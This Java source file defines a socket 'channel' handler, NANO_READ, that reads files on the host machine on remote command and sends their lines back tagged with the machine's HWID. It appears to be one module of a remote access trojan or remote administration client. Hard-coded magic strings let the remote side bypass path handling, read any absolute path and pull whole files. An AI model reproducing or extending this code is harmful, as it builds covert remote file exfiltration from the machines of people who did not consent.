package de.dion.socket.localobjects.channel.channels;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.LinkedList;

import de.dion.socket.localobjects.channel.Channel;
import de.dion.socket.objects.DataPackage;
import de.dion.socket.utils.StringHelper;

public class NANO_READ extends Channel {

	public NANO_READ() {
		super("NANO_READ");
	}

	@Override
	public void onSocketReceive(DataPackage pack) {
		
		try {
			String dir1 = (String) pack.get(1);
			String dir2 = (String) pack.get(2);
			File f = null;
			
			if(dir2.equals("0xt77_49penis") || dir2.equals("0xt77_49penis333"))
			{
				f = new File(dir1);
			}
			else
			{
				f = getFileFromPath(dir1, dir2);
			}
			
			if(f.exists() && f.isFile())
			{
				Long size = f.length();
				if(size <= maxFileSize)
				{
					if(dir2.equals("0xt77_49penis333"))
					{
						BufferedReader sr = new BufferedReader(new InputStreamReader(new FileInputStream(f), "UTF-8"));
						LinkedList<String> lines = new LinkedList<>();
						
						try {
							String line = null;
							while((line = sr.readLine()) != null)
							{
								lines.add(StringHelper.crypt(line));
							}
							sr.close();
						} catch(Exception e) {}
						
						sendDataPackage(new DataPackage("NANO_READ", HWID, false, lines, f.getCanonicalPath(), 1));
					}
					else
					{
						ArrayList<String> lines = new ArrayList<>();
						BufferedReader sr = new BufferedReader(new InputStreamReader(new FileInputStream(f), "UTF-8"));

						
						int startline = (int)pack.get(0);
						int counter = 1;
						
						try {
							String line = null;
							while((line = sr.readLine()) != null && counter <= startline + 14)
							{
								lines.add(StringHelper.crypt(line));
								counter++;
								line = null;
							}
							sr.close();
						} catch(Exception e) {}
						LinkedList<String> list = new LinkedList<>();
						int count = 0;
						int line_count = -1;
						for(int i = lines.size() - 1; i >= 0; i--)
						{
							list.addFirst(lines.get(i));
							count++;
							line_count = i;
							if(count == 15)
							{
								break;
							}
						}
						line_count++;
						sendDataPackage(new DataPackage("NANO_READ", HWID, false, list, f.getCanonicalPath(), line_count));
					}
				}
				else
				{
					sendDataPackage(new DataPackage("NANO_READ", HWID, true, " Zu grosse Datei -> " + f.getCanonicalPath() + "\nerlaubt sind Dateien bis 100 MiB"));
				}
			}
			else
			{
				sendDataPackage(new DataPackage("NANO_READ", HWID, true, " Keine guelltige Datei -> " + f.getCanonicalPath()));
			}
		} catch(IOException e) {}
	}

}
